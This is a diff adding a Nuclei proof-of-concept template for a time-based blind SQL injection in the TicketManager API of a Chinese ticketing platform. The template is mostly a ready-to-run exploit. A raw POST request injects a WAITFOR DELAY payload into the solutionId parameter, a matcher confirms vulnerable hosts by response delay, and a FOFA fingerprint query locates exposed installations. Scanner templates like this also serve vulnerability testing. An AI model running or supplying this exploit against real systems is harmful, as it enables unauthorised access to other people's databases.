@@ -1,0 +1,32 @@
+id: poc-ofnegz4tc1498167
+info:
+  name: 中成科信票务管理平台TicketManager存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ofnegz4tc1498167
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ofnegz4tc1498167
+    fofa: body="技术支持：北京中成科信科技发展有限公司"
+http:
+- raw:
+  - 'POST /SystemManager/Api/TicketManager.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: close
+
+    Method=GetReServeOrder&solutionId=1'' WAITFOR DELAY ''0:0:5''--'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
